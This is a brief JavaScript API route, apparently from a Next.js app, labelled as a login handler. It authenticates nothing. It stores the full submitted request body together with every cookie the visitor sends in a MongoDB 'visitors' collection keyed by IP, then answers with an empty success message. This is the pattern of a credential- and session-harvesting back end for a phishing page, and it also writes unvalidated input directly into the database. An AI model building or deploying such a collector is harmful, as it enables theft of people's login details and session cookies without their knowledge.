import mongoose from "mongoose";
import connectDb from "../../lib/connectDb";

export default async function login(req, res) {
  await connectDb();

  const cookies = req.cookies || {};
  const clientIP =
    req.ip || req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  try {
    await mongoose.connection.db.collection("visitors").updateOne(
      { ip: clientIP },
      {
        $set: { ...req.body, cookies },
      },
      { upsert: true }
    );
  } catch (error) {
    console.log({ error });
  }

  res.status(200).json({ message: "" });
}

